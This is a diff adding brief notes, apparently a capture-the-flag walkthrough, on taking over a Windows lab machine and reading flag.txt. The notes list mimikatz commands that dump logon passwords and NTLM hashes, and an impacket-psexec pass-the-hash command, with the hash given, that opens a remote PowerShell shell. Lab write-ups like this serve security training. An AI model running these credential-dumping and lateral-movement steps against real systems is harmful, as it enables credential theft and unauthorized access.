@@ -1,0 +1,16 @@
+use mimikatz and copy it to the target machine 
+
+
+
+privilege::debug -> grant current account to SeDebugPrivilege rights 
+
+Sekurlsa:logonPasswords -> dump out all the passwords 
+copy ntlm and domain of cloudbase-init
+
+use psexec to connect to the target machine 
+impacket-psexec cloudbase-int@10.10.0.xxx -hashes:82d030c6ac1e42127c42a33e58ef1274 powershell.exe 
+
+after getting inside 
+ Get-ChildItem -Path C:\ -Filter flag.txt -Recurse -ErrorAction SilentlyContinue
+ 
+  Get-Content C:\Users\Administrator\Desktop\flag.txt
